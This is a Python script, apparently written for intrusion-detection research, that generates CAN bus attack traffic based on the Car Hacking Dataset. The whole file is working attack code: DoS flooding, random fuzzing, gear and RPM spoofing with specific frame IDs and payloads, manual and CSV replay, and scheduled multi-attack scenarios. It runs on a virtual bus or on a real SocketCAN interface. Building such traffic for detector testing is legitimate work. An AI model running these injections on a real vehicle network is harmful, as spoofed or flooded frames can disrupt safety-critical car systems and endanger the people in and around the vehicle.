#!/usr/bin/env python3
"""Interactive CAN bus attack simulator.

Sends attack traffic to a Linux CAN interface (including vcan) based on
patterns observed in the Car Hacking Dataset (OTIDS / KAIST).

Attack types:
    - DoS:   Floods ID 0x0000 with all-zero payloads at max rate
    - Fuzzy: Random IDs and random payloads at random intervals
    - Gear:  Spoofs gear-related ID 0x043F with crafted payload
    - RPM:   Spoofs RPM-related ID 0x0316 with crafted payload
    - Manual: User-defined frames or loaded from CSV

Requires: python-can, Linux with SocketCAN support.

Usage::

    python -m scripts.can_attack_sim
    # or
    python scripts/can_attack_sim.py
"""

from __future__ import annotations

import collections
from typing import Callable
import datetime
import json
import random
import sys
import threading
import time
from pathlib import Path

try:
    import can
except ImportError:
    print("ERROR: python-can is required. Install with: pip install python-can")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Interface discovery
# ---------------------------------------------------------------------------

_VIRTUAL_SENTINEL = "__virtual__"


def discover_can_interfaces() -> list[str]:
    """Scan /sys/class/net for CAN-capable interfaces (including vcan)."""
    net_dir = Path("/sys/class/net")
    interfaces: list[str] = []
    if not net_dir.exists():
        return interfaces
    for iface in sorted(net_dir.iterdir()):
        iface_type = iface / "type"
        uevent = iface / "uevent"
        name = iface.name
        # CAN interfaces have ARPHRD_CAN (type 280) or start with vcan/can
        try:
            type_val = iface_type.read_text().strip()
            if type_val == "280":
                interfaces.append(name)
                continue
        except (OSError, ValueError):
            pass
        if name.startswith(("can", "vcan", "slcan")):
            interfaces.append(name)
    return interfaces


def choose_interface(auto_select: int | None = None) -> str:
    """Let the user pick a CAN interface interactively, or auto-select by index.

    Parameters
    ----------
    auto_select:
        0-based index into the discovered interface list.  When provided the
        function returns that interface without prompting.  If the index is out
        of range, or no interfaces are found, ``_VIRTUAL_SENTINEL`` is returned.

    Returns either an interface name (e.g. ``vcan0``) or the sentinel
    ``_VIRTUAL_SENTINEL`` when the python-can virtual bus should be used.
    """
    interfaces = discover_can_interfaces()
    if not interfaces:
        print("\n  No CAN interfaces found on this machine.")
        print("  To create a virtual CAN interface run:")
        print("    sudo modprobe vcan")
        print("    sudo ip link add dev vcan0 type vcan")
        print("    sudo ip link set up vcan0")
        print("  Using python-can virtual bus (in-process simulation, no kernel module needed).\n")
        return _VIRTUAL_SENTINEL

    if auto_select is not None:
        if 0 <= auto_select < len(interfaces):
            print(f"\n  [Auto] Selected interface: {interfaces[auto_select]}")
            return interfaces[auto_select]
        print(f"\n  [Auto] Index {auto_select} out of range ({len(interfaces)} interface(s) found). Falling back to virtual bus.")
        return _VIRTUAL_SENTINEL

    print("\n  Available CAN interfaces:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()
    while True:
        choice = input(f"Select interface [1-{len(interfaces)}] or type name: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
            return interfaces[int(choice) - 1]
        if choice:
            return choice


# ---------------------------------------------------------------------------
# Session logging
# ---------------------------------------------------------------------------

def _create_log_session() -> str:
    """Create a timestamped log file for this run, return its path."""
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    log_path = f"{ts}.log"
    with open(log_path, "w", encoding="utf-8") as f:
        f.write(f"# CAN Attack Session — {ts}\n\n")
    print(f"\n  [LOG] Session log: {log_path}")
    return log_path


def _log_attack_result(log_path: str, result: dict, add_separator: bool = False) -> None:
    """Append one attack result block to the log file.

    Set *add_separator* to ``True`` (option 6 / scenario mode) to append a
    ``==========================`` divider after the block.
    """
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(f"Attack Type: {result['attack_type']},\n")
        f.write(f"Frames Sent: {result['frames_sent']},\n")
        f.write(f"Interval: {result['interval']}\n")
        f.write(f"Start Timestamp: {result['start_ts']:.6f}\n")
        f.write(f"Stop Timestamp: {result['stop_ts']:.6f}\n")
        f.write(f"Duration: {result['stop_ts'] - result['start_ts']:.6f}\n")
        if add_separator:
            f.write("==========================\n")


def _log_session_summary(log_path: str, results: list[dict]) -> None:
    """Append aggregated totals section to the log file."""
    totals: dict[str, dict] = collections.defaultdict(
        lambda: {"total_duration": 0.0, "frequency": 0}
    )
    for r in results:
        at = r["attack_type"]
        totals[at]["total_duration"] += r["stop_ts"] - r["start_ts"]
        totals[at]["frequency"] += 1
    with open(log_path, "a", encoding="utf-8") as f:
        f.write("\n============TOTAL==============\n")
        for at, data in totals.items():
            f.write(f"Attack Type: {at},\n")
            f.write(f"Total Duration: {data['total_duration']:.6f}\n")
            f.write(f"Frequency:{data['frequency']}\n\n")
    print(f"\n  [LOG] Summary written to {log_path}")


# ---------------------------------------------------------------------------
# Attack generators
# ---------------------------------------------------------------------------

def _send_frames(bus: can.Bus, frames: list[can.Message], interval: float,
                 count: int, label: str) -> tuple[int, float, float]:
    """Send frames in a loop, return (sent, start_timestamp, stop_timestamp)."""
    sent = 0
    start_ts = time.time()
    print(f"\n  Sending {label} attack — press Ctrl+C to stop")
    print(f"  Target count: {count if count > 0 else 'infinite'},  interval: {interval*1000:.2f} ms\n")
    try:
        i = 0
        while count <= 0 or i < count:
            frame = frames[i % len(frames)]
            bus.send(frame)
            sent += 1
            i += 1
            if sent % 500 == 0:
                print(f"  [{sent} frames sent]", end="\r")
            if interval > 0:
                time.sleep(interval)
    except KeyboardInterrupt:
        pass
    stop_ts = time.time()
    print(f"\n  Done — {sent} frames sent.")
    return sent, start_ts, stop_ts

def _parse_can_csv(path, filter_flag=None) -> list[tuple[float, can.Message]]:
    """
    Parse a CAN CSV file and return a list of (timestamp, can.Message).
    If filter_flag is set, only include rows where flag != filter_flag.
    """
    frames = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            parts = line.strip().split(",")
            if len(parts) < 5 or parts[0].lower() == "timestamp":
                continue
            ts = parts[0]
            can_id_str = parts[1]
            flag = parts[-1].strip()
            if filter_flag is not None and flag == filter_flag:
                continue
            try:
                ts_f = float(ts)
                if "e" in can_id_str.lower() or "+" in can_id_str:
                    arb_id = int(float(can_id_str))
                else:
                    arb_id = int(can_id_str, 16)
                data_fields = parts[3:-1]
                data = []
                for d in data_fields[:8]:
                    try:
                        data.append(int(d, 16) if d else 0)
                    except ValueError:
                        try:
                            data.append(int(d))
                        except ValueError:
                            data.append(0)
                data = (data + [0]*8)[:8]
                frame = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
                frames.append((ts_f, frame))
            except Exception:
                continue
    return frames


def replay_can_frames(bus, frames, stop_event=None,
                      use_timing=True, result_container=None) -> int:
    if not frames:
        print("No frames found in file.")
        return
    sent = 0
    for i, (ts, frame) in enumerate(frames):
        if stop_event and stop_event.is_set():
            break
        bus.send(frame)
        sent += 1
        if result_container is not None:
            result_container[0] = sent
        if i + 1 < len(frames):
            delay = frames[i + 1][0] - ts
            if use_timing and delay > 0:
                time.sleep(delay)
            elif not use_timing:
                time.sleep(0.001)
    return sent

def generate_and_replay_synthetic_normal_can_frame(
    bus,
    count: int = 1000,
    interval: float = 0.002,
    stop_event=None,
    result_container=None,
    ids: list[int] | None = None,
) -> int:
    """Replay synthetic normal CAN traffic.

    Parameters
    ----------
    count:
        Number of frames to send.  Pass ``0`` to run indefinitely until
        *stop_event* is set.
    ids:
        List of CAN arbitration IDs to cycle through.  Defaults to
        ``[0x100, 0x200, 0x300, 0x400, 0x500]``.
    """
    if ids is None:
        ids = [0x100, 0x200, 0x300, 0x400, 0x500]
    sent = 0
    i = 0
    while True:
        if stop_event and stop_event.is_set():
            break
        if count != 0 and sent >= count:
            break
        arb_id = ids[i % len(ids)]
        data = [(i + b) % 256 for b in range(8)]
        frame = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
        bus.send(frame)
        if result_container is not None:
            result_container[0] = sent
        sent += 1
        i += 1
        if interval > 0:
            time.sleep(interval)
    return sent

def start_normal_replay_thread(
    bus,
    prompt: str = "  Path to normal CAN CSV (leave blank to use synthetic normal traffic): ",
    normal_settings: dict | None = None,
) -> tuple[threading.Thread, threading.Event, list[int]]:
    """Start a background thread that sends normal CAN traffic.

    If *normal_settings* is provided the thread is configured from the dict
    (no interactive prompt).  Otherwise the user is asked interactively.
    """
    stop_event = threading.Event()
    result_container: list[int] = [0]

    if normal_settings is not None:
        raw_ids = normal_settings.get("ids", [0x100, 0x200, 0x300, 0x400, 0x500])
        ids: list[int] = [int(x, 16) if isinstance(x, str) else int(x) for x in raw_ids]
        frames_count: int = normal_settings.get("frames", 1000)
        interval: float = normal_settings.get("interval", 0.002)
        print(
            f"  [Normal] config — ids={[hex(x) for x in ids]}, "
            f"frames={frames_count}, interval={interval}s"
        )
        t = threading.Thread(
            target=generate_and_replay_synthetic_normal_can_frame,
            args=(bus, frames_count, interval, stop_event, result_container, ids),
        )
        t.start()
        return t, stop_event, result_container

    # Interactive mode — prompt the user
    normal_path = input(prompt).strip()
    if normal_path:
        if not Path(normal_path).exists():
            print(f"  [WARNING] File not found: {normal_path}. Using synthetic normal traffic.")
            t = threading.Thread(
                target=generate_and_replay_synthetic_normal_can_frame,
                args=(bus, 0, 0.002, stop_event, result_container),
            )
        else:
            frames = _parse_can_csv(normal_path)
            t = threading.Thread(
                target=replay_can_frames,
                args=(bus, frames, stop_event, True, result_container),
            )
    else:
        print("  Using synthetic normal traffic.")
        t = threading.Thread(
            target=generate_and_replay_synthetic_normal_can_frame,
            args=(bus, 0, 0.002, stop_event, result_container),
        )
    t.start()
    return t, stop_event, result_container


_DOS_INTERVAL = 0.0005
_FUZZY_INTERVAL = 0.005
_GEAR_INTERVAL = 0.001
_RPM_INTERVAL = 0.001
_MANUAL_INTERVAL = 0.001


def attack_dos(
    bus: can.Bus,
    *,
    count: int | None = None,
) -> dict:
    """DoS attack: flood ID 0x0000, all-zero payload at the default rate."""
    print("\n  === DoS Attack ===")
    print("  Pattern: ID=0x0000, DLC=8, payload=00 00 00 00 00 00 00 00")
    print(f"  Interval: ~{_DOS_INTERVAL} s (matching dataset timing)")
    if count is None:
        count_str = input("  Number of frames to send (0 = infinite, default 5000): ").strip()
        count = int(count_str) if count_str else 5000
    print()

    frame = can.Message(arbitration_id=0x0000, data=[0]*8, is_extended_id=False)
    sent, start_ts, stop_ts = _send_frames(bus, [frame], _DOS_INTERVAL, count, "DoS")

    return {
        "attack_type": "DoS", "frames_sent": sent,
        "interval": _DOS_INTERVAL, "start_ts": start_ts, "stop_ts": stop_ts,
    }

def attack_fuzzy(
    bus: can.Bus,
    *,
    count: int | None = None,
) -> dict:
    """Fuzzy attack: random IDs (0x000–0x7FF), random payloads."""
    print("\n  === Fuzzy Attack ===")
    print("  Pattern: random ID (0x000-0x7FF), DLC=8, random payload")
    print(f"  Interval: ~{_FUZZY_INTERVAL} s (varied)")
    if count is None:
        count_str = input("  Number of frames to send (0 = infinite, default 2000): ").strip()
        count = int(count_str) if count_str else 2000
    print()

    batch_size = min(count if count > 0 else 10000, 10000)
    frames = []
    for _ in range(batch_size):
        arb_id = random.randint(0x000, 0x7FF)
        data = [random.randint(0, 255) for _ in range(8)]
        frames.append(can.Message(arbitration_id=arb_id, data=data, is_extended_id=False))
    sent, start_ts, stop_ts = _send_frames(bus, frames, _FUZZY_INTERVAL, count, "Fuzzy")

    return {
        "attack_type": "Fuzzy", "frames_sent": sent,
        "interval": _FUZZY_INTERVAL, "start_ts": start_ts, "stop_ts": stop_ts,
    }

def attack_gear(
    bus: can.Bus,
    *,
    count: int | None = None,
) -> dict:
    """Gear spoofing: inject ID 0x043F with crafted gear payload."""
    print("\n  === Gear Spoofing Attack ===")
    print("  Pattern: ID=0x043F, DLC=8, payload=01 45 60 FF 6B 00 00 00")
    print(f"  Interval: ~{_GEAR_INTERVAL} s")
    if count is None:
        count_str = input("  Number of frames to send (0 = infinite, default 3000): ").strip()
        count = int(count_str) if count_str else 3000
    print()

    frame = can.Message(
        arbitration_id=0x043F,
        data=[0x01, 0x45, 0x60, 0xFF, 0x6B, 0x00, 0x00, 0x00],
        is_extended_id=False,
    )
    sent, start_ts, stop_ts = _send_frames(bus, [frame], _GEAR_INTERVAL, count, "Gear")

    return {
        "attack_type": "Gear", "frames_sent": sent,
        "interval": _GEAR_INTERVAL, "start_ts": start_ts, "stop_ts": stop_ts,
    }

def attack_rpm(
    bus: can.Bus,
    *,
    count: int | None = None,
) -> dict:
    """RPM spoofing: inject ID 0x0316 with crafted RPM payload."""
    print("\n  === RPM Spoofing Attack ===")
    print("  Pattern: ID=0x0316, DLC=8, payload=45 29 24 FF 29 24 00 FF")
    print(f"  Interval: ~{_RPM_INTERVAL} s")
    if count is None:
        count_str = input("  Number of frames to send (0 = infinite, default 3000): ").strip()
        count = int(count_str) if count_str else 3000
    print()

    frame = can.Message(
        arbitration_id=0x0316,
        data=[0x45, 0x29, 0x24, 0xFF, 0x29, 0x24, 0x00, 0xFF],
        is_extended_id=False,
    )
    sent, start_ts, stop_ts = _send_frames(bus, [frame], _RPM_INTERVAL, count, "RPM")

    return {
        "attack_type": "RPM", "frames_sent": sent,
        "interval": _RPM_INTERVAL, "start_ts": start_ts, "stop_ts": stop_ts,
    }

# ---------------------------------------------------------------------------
# Manual mode
# ---------------------------------------------------------------------------

def manual_hand_input(bus: can.Bus) -> dict:
    """Let the user type CAN frames interactively."""
    print("\n  === Manual Input Mode ===")
    print("  Enter frames as:  ID  DATA (hex bytes, space-separated)")
    print("  Example:  043F 01 45 60 FF 6B 00 00 00")
    print("  Type 'done' to finish, 'repeat N INTERVAL' to replay last frame.\n")
    start_ts = time.time()
    last_frame: can.Message | None = None
    sent = 0
    while True:
        line = input("  > ").strip()
        if not line or line.lower() == "done":
            break
        if line.lower().startswith("repeat") and last_frame is not None:
            parts = line.split()
            try:
                n = int(parts[1]) if len(parts) > 1 else 10
                interval = float(parts[2]) if len(parts) > 2 else 0.001
            except (ValueError, IndexError):
                print("    Usage: repeat [COUNT] [INTERVAL_SEC]  (e.g. repeat 100 0.001)")
                continue
            sent += _send_frames(bus, [last_frame], interval, n, "Manual-repeat")[0]
            continue
        if line.lower().startswith("repeat") and last_frame is None:
            print("    No previous frame to repeat. Send a frame first.")
            continue
        try:
            tokens = line.split()
            arb_id = int(tokens[0], 16)
            data = [int(b, 16) for b in tokens[1:9]]
            frame = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
            bus.send(frame)
            last_frame = frame
            sent += 1
            print(f"    Sent ID=0x{arb_id:03X} data={' '.join(f'{b:02X}' for b in data)}")
        except (ValueError, IndexError) as e:
            print(f"    Parse error: {e}")
    stop_ts = time.time()
    print(f"\n  Manual session done \u2014 {sent} frames sent.")
    return {
        "attack_type": "Manual", "frames_sent": sent,
        "interval": _MANUAL_INTERVAL, "start_ts": start_ts, "stop_ts": stop_ts,
    }


def manual_csv_load(
    bus: can.Bus,
    *,
    path: str | None = None,
    frames_list: list[can.Message] | None = None,
    count: int | None = None,
) -> dict | None:
    """Load CAN frames from a CSV file (or a pre-built list) and send them.

    **Programmatic mode** — supply *path* or *frames_list*:
        Returns a result dict for logging.
        Both *path* and *frames_list* send at ``_MANUAL_INTERVAL``.

    **Interactive mode** — no *path* / *frames_list*:
        Prompts the user for a CSV path, filter choice, and timing option.
        Returns ``None`` (logging handled by the caller).
    """
    if path is None and frames_list is None:
        # --- Interactive path ---
        print("\n  === CSV Replay Mode ===")
        path_str = input("  Path to CSV file: ").strip()
        if not path_str:
            print("  Cancelled.")
            return None
        p = Path(path_str)
        if not p.exists():
            print(f"  File not found: {p}")
            return None

        filter_choice = input("  Send [a]ttack frames only, or [b]oth? (default: b): ").strip().lower()
        send_all = filter_choice != "a"
        timing_choice = input("  Use original timing? [y/n] (default: y): ").strip().lower()
        use_timing = timing_choice != "n"
        type_label = "attack" if not send_all else "all"
        print(f"  Send {type_label} frames \n")

        raw = _parse_can_csv(str(p), filter_flag="R" if not send_all else None)
        print(f"\n  Loaded {len(raw)} frames from {p.name}")
        if not raw:
            print("  No frames to send after filtering.")
            return None
        print(f"  ID range: 0x{min(f[1].arbitration_id for f in raw):03X} - "
              f"0x{max(f[1].arbitration_id for f in raw):03X}")
        print("  Press Ctrl+C to stop\n")
        stop_event = threading.Event()
        result_container: list[int] = [0]
        t = threading.Thread(
            target=replay_can_frames,
            args=(bus, raw, stop_event, use_timing, result_container),
        )
        t.start()
        try:
            while t.is_alive():
                t.join(timeout=0.1)
        except KeyboardInterrupt:
            print("\n  [Replay interrupted]")
            stop_event.set()
            t.join()
        sent = result_container[0]
        print(f"\n  Done — {sent} frames sent.")
        return None

    # --- Programmatic path ---
    if frames_list is None:
        # Load from the provided path
        p = Path(path)  # type: ignore[arg-type]
        if not p.exists():
            print(f"  [ERROR] CSV path not found: {path}")
            return None
        raw = _parse_can_csv(str(p))
        if not raw:
            print(f"  [ERROR] No frames loaded from {path}")
            return None
        frames_list = [msg for _, msg in raw]

    send_count = count if count and count > 0 else len(frames_list)
    sent, start_ts, stop_ts = _send_frames(
        bus, frames_list, _MANUAL_INTERVAL, send_count, "Manual"
    )
    return {
        "attack_type": "Manual", "frames_sent": sent,
        "interval": _MANUAL_INTERVAL, "start_ts": start_ts, "stop_ts": stop_ts,
    }


def attack_manual(
    bus: can.Bus,
    *,
    frames_override: list[can.Message] | None = None,
    csv_path: str | None = None,
    count: int | None = None,
) -> dict | None:
    """Manual mode: hand-input or CSV replay.

    **Programmatic mode** — supply *frames_override* or *csv_path*:
        Delegates to ``manual_csv_load`` and returns a result dict.

    **Interactive mode** — no overrides:
        Lets the user choose hand-input (``manual_hand_input``) or CSV replay
        (``manual_csv_load``) and returns the result dict from the chosen helper.
    """
    if frames_override is not None or csv_path is not None:
        return manual_csv_load(
            bus,
            path=csv_path,
            frames_list=frames_override,
            count=count,
        )

    # Interactive path
    print("\n  === Manual Mode ===")
    print("    [1] Type frames by hand")
    print("    [2] Load from CSV file")
    choice = input("  Select [1/2]: ").strip()
    if choice == "2":
        return manual_csv_load(bus)
    else:
        return manual_hand_input(bus)


def _candump_listener(bus: can.Bus, stop_event: threading.Event) -> None:
    """Print received frames in candump format (virtual bus only)."""
    while not stop_event.is_set():
        msg = bus.recv(timeout=0.1)
        if msg:
            data_hex = msg.data.hex().upper()
            print(f"  ({msg.timestamp:.6f}) vcan_sim {msg.arbitration_id:03X}#{data_hex}")


# ---------------------------------------------------------------------------
# Scenario configuration & execution (option 6)
# ---------------------------------------------------------------------------

_VALID_ATTACK_TYPES = {"Dos", "Fuzzy", "Gear", "RPM", "Manual"}


def load_scenario_config(path: str) -> dict | None:
    """Load and validate a scenario JSON config file.

    Returns the parsed config dict on success, ``None`` if any error is found
    (all problems are printed so the user knows what to fix).

    Expected JSON structure::

        {
            "attack_setting": {
                "async": true,
                "attack_items": [
                    {
                        "id": 1,
                        "attack_type": "Dos",
                        "frames": 1000,
                        "frequencies": 3,
                        "repeat_interval": 3600
                    }
                ]
            },
            "normal_setting": {
                "ids": ["0x100", "0x200", "0x300", "0x400", "0x500"],
                "frames": 1000,
                "interval": 0.02
            }
        }

    For a ``Manual`` attack_item supply either:
    * ``"path": "/path/to/file.csv"`` — frames are loaded from a CSV file, or
    * ``"frames": ["043F 01 45 ...", ...]`` — inline list of hex frame strings.
    """
    try:
        with open(path, "r", encoding="utf-8") as f:
            config = json.load(f)
    except FileNotFoundError:
        print(f"\n  [ERROR] Config file not found: {path}")
        return None
    except json.JSONDecodeError as e:
        print(f"\n  [ERROR] Invalid JSON in '{path}': {e}")
        return None

    errors: list[str] = []

    # --- attack_setting ---
    if "attack_setting" not in config:
        errors.append("Missing top-level key 'attack_setting'")
    else:
        as_ = config["attack_setting"]
        if "async" not in as_:
            errors.append("'attack_setting': missing 'async' (bool)")
        elif not isinstance(as_["async"], bool):
            errors.append(
                f"'attack_setting.async': expected bool, got {type(as_['async']).__name__}"
            )
        if "attack_items" not in as_:
            errors.append("'attack_setting': missing 'attack_items' (list)")
        elif not isinstance(as_["attack_items"], list):
            errors.append("'attack_setting.attack_items': expected a list")
        elif len(as_["attack_items"]) == 0:
            errors.append("'attack_setting.attack_items': list must not be empty")
        else:
            for idx, item in enumerate(as_["attack_items"]):
                p = f"attack_items[{idx}]"
                for key in ("id", "attack_type", "frequencies", "repeat_interval"):
                    if key not in item:
                        errors.append(f"{p}: missing '{key}'")
                at = item.get("attack_type", "")
                if at and at not in _VALID_ATTACK_TYPES:
                    errors.append(
                        f"{p}: invalid attack_type '{at}' — must be one of "
                        f"{sorted(_VALID_ATTACK_TYPES)}"
                    )
                if "frames" not in item:
                    errors.append(f"{p}: missing 'frames'")
                else:
                    if at != "Manual" and not isinstance(item["frames"], int):
                        errors.append(f"{p}: 'frames' must be an integer for {at} attack")
                    if at == "Manual" and not isinstance(item["frames"], (int, list)):
                        errors.append(
                            f"{p}: 'frames' for Manual must be an int count or a list of frame strings"
                        )

    # --- normal_setting ---
    if "normal_setting" not in config:
        errors.append("Missing top-level key 'normal_setting'")
    else:
        ns = config["normal_setting"]
        for key in ("frames", "interval"):
            if key not in ns:
                errors.append(f"'normal_setting': missing '{key}'")
        if "ids" in ns and not isinstance(ns["ids"], list):
            errors.append("'normal_setting.ids': expected a list of integers or hex strings (e.g. 256 or \"0x100\")")

    if errors:
        print(f"\n  [CONFIG ERROR] {len(errors)} problem(s) found in '{path}':")
        for err in errors:
            print(f"    \u2022 {err}")
        print()
        return None

    return config


def _parse_manual_frames(item: dict) -> list[can.Message] | None:
    """Extract a ``can.Message`` list from a Manual attack_item.

    Tries ``item['path']`` first (CSV file), then ``item['frames']`` (inline list).
    """
    path_val: str | None = item.get("path")
    frames_val = item.get("frames")

    if path_val:
        p = Path(path_val)
        if not p.exists():
            print(f"  [ERROR] Manual frames path not found: {path_val}")
            return None
        raw = _parse_can_csv(str(p))
        return [msg for _, msg in raw]

    if isinstance(frames_val, list):
        messages: list[can.Message] = []
        for s in frames_val:
            try:
                tokens = str(s).split()
                arb_id = int(tokens[0], 16)
                data = [int(b, 16) for b in tokens[1:9]]
                messages.append(can.Message(arbitration_id=arb_id, data=data, is_extended_id=False))
            except (ValueError, IndexError) as e:
                print(f"  [WARNING] Could not parse frame '{s}': {e} — skipping")
        if messages:
            return messages
        print("  [ERROR] No valid frames parsed from 'frames' list.")
        return None

    print("  [ERROR] Manual attack_item requires 'path' or a list in 'frames'.")
    return None


def _run_scenario_attack_item(
    bus: can.Bus,
    item: dict,
    log_path: str,
    results: list[dict],
    results_lock: threading.Lock,
    on_state_change: "Callable[[str, int], None] | None" = None,
) -> None:
    """Run one attack_item from a scenario config, respecting *frequencies* and *repeat_interval*.

    *repeat_interval* is the pause (in seconds) **between** consecutive frequency runs.
    It has nothing to do with the per-frame send interval, which is always the attack's default.
    The normal traffic thread is managed by the caller (``attack_scenario``).
    """
    attack_type: str = item["attack_type"]
    raw_frames = item["frames"]
    frame_count: int = raw_frames if isinstance(raw_frames, int) else 0
    frequencies: int = item["frequencies"]
    freq_interval: float = float(item["repeat_interval"])

    for freq_idx in range(frequencies):
        if freq_idx > 0:
            print(
                f"\n  [Scenario] Waiting {freq_interval}s before {attack_type} "
                f"run {freq_idx + 1}/{frequencies} \u2026"
            )
            time.sleep(freq_interval)

        print(f"\n  [Scenario] {attack_type} \u2014 run {freq_idx + 1}/{frequencies}")
        result: dict | None = None

        if on_state_change is not None:
            on_state_change(attack_type, 1)

        if attack_type == "Dos":
            result = attack_dos(bus, count=frame_count)
        elif attack_type == "Fuzzy":
            result = attack_fuzzy(bus, count=frame_count)
        elif attack_type == "Gear":
            result = attack_gear(bus, count=frame_count)
        elif attack_type == "RPM":
            result = attack_rpm(bus, count=frame_count)
        elif attack_type == "Manual":
            path_val: str | None = item.get("path")
            msgs = None if path_val else _parse_manual_frames(item)
            if not path_val and msgs is None:
                print("  [Scenario] Skipping Manual item \u2014 no valid frames.")
                continue
            send_count = frame_count if frame_count > 0 else (len(msgs) if msgs else 0)
            result = attack_manual(
                bus,
                csv_path=path_val,
                frames_override=msgs,
                count=send_count,
            )

        if on_state_change is not None:
            on_state_change(attack_type, 0)

        if result is not None:
            with results_lock:
                results.append(result)
            _log_attack_result(log_path, result, add_separator=True)


def attack_scenario(
    bus: can.Bus,
    *,
    path: str | None = None,
    on_state_change: "Callable[[str, int], None] | None" = None,
) -> None:
    """Option 6 — Load and run an attack scenario from a JSON config file.

    Parameters
    ----------
    path:
        Path to the scenario JSON file.  When omitted the user is prompted
        interactively (original behaviour).
    on_state_change:
        Optional callback ``(attack_type, active)`` fired before/after each
        attack run (``active=1`` when starting, ``0`` when done).
    """
    print("\n  === Scenario Testing ===")
    if path is None:
        path = input("  Path to scenario JSON file: ").strip()
        if not path:
            print("  Cancelled.")
            return

    config = load_scenario_config(path)
    if config is None:
        return  # validation errors already printed

    attack_setting = config["attack_setting"]
    normal_setting = config["normal_setting"]
    run_async: bool = attack_setting["async"]
    attack_items: list[dict] = attack_setting["attack_items"]

    log_path = _create_log_session()
    results: list[dict] = []
    results_lock = threading.Lock()

    mode_label = "parallel" if run_async else "sequential"
    print(f"\n  Loaded {len(attack_items)} attack item(s).  mode={mode_label}")
    print(f"  Normal traffic settings: {normal_setting}")

    # Start one shared normal traffic thread that runs through all attacks and waits.
    t_n, se_n, rc_n = start_normal_replay_thread(bus, normal_settings=normal_setting)

    try:
        if run_async:
            threads: list[threading.Thread] = []
            for item in attack_items:
                t = threading.Thread(
                    target=_run_scenario_attack_item,
                    args=(bus, item, log_path, results, results_lock),
                    kwargs={"on_state_change": on_state_change},
                    daemon=False,
                )
                threads.append(t)
            print(f"\n  Starting {len(threads)} attack(s) in parallel \u2026")
            for t in threads:
                t.start()
            try:
                for t in threads:
                    t.join()
            except KeyboardInterrupt:
                print("\n  [Interrupted] waiting for threads to finish \u2026")
                for t in threads:
                    t.join()
        else:
            print("\n  Running attacks sequentially \u2026")
            try:
                for item in attack_items:
                    _run_scenario_attack_item(
                        bus, item, log_path, results, results_lock,
                        on_state_change=on_state_change,
                    )
            except KeyboardInterrupt:
                print("\n  [Interrupted]")
    finally:
        se_n.set()
        t_n.join()
        normal_sent = rc_n[0]
        print(f"\n  Normal Replay Done \u2014 {normal_sent} frames sent.")

    _log_session_summary(log_path, results)
    print(f"\n  Scenario complete. Log saved to: {log_path}")


# ---------------------------------------------------------------------------
# Main menu
# ---------------------------------------------------------------------------

ATTACK_MENU = {
    "1": ("DoS Flood", attack_dos),
    "2": ("Fuzzy (Random)", attack_fuzzy),
    "3": ("Gear Spoofing", attack_gear),
    "4": ("RPM Spoofing", attack_rpm),
    "5": ("Manual / CSV Replay", attack_manual),
    "6": ("Scenario Testing (JSON)", attack_scenario),
}


def main() -> None:
    print("=" * 56)
    print("   CAN Bus Attack Simulator")
    print("   Based on Car Hacking Dataset (OTIDS/KAIST)")
    print("=" * 56)

    iface = choose_interface()

    if iface == _VIRTUAL_SENTINEL:
        print("\n  Using: python-can virtual bus (loopback, no hardware needed)")
        print("  [candump] Frames will be printed below as they are sent.")
        try:
            bus = can.Bus(interface="virtual", channel="vcan_sim", receive_own_messages=True)
        except Exception as e:
            print(f"\n  ERROR: Could not open virtual bus: {e}")
            sys.exit(1)
        stop_event = threading.Event()
        threading.Thread(target=_candump_listener, args=(bus, stop_event), daemon=True).start()
    else:
        print(f"\n  Using interface: {iface}")
        print(f"  Tip: run 'candump {iface}' in another terminal to monitor frames.")
        stop_event = None
        try:
            bus = can.Bus(interface="socketcan", channel=iface)
        except Exception as e:
            print(f"\n  ERROR: Could not open {iface}: {e}")
            print("  Make sure the interface is up:")
            print(f"    sudo ip link set up {iface}")
            sys.exit(1)

    try:
        while True:
            print("\n  Attack Types:")
            for key, (name, _) in ATTACK_MENU.items():
                print(f"    [{key}] {name}")
            print("    [q] Quit\n")
            choice = input("  Select attack type: ").strip().lower()
            if choice == "q":
                break
            if choice not in ATTACK_MENU:
                print("  Invalid choice.")
                continue
            _, func = ATTACK_MENU[choice]
            if choice == "6":
                # Scenario mode handles its own logging and normal thread internally
                func(bus)
            else:
                # Interactive single-attack mode: start normal thread, run attack, stop thread
                log_path = _create_log_session()
                t_n, se_n, rc_n = start_normal_replay_thread(bus)
                try:
                    result = func(bus)
                finally:
                    se_n.set()
                    t_n.join()
                    normal_sent = rc_n[0]
                    print(f"\n  Normal Replay Done \u2014 {normal_sent} frames sent.")
                if isinstance(result, dict):
                    _log_attack_result(log_path, result)
                    _log_session_summary(log_path, [result])
    except (KeyboardInterrupt, EOFError):
        print()
    finally:
        if stop_event is not None:
            stop_event.set()
        bus.shutdown()
        print("  Bus closed. Goodbye.")


if __name__ == "__main__":
    main()
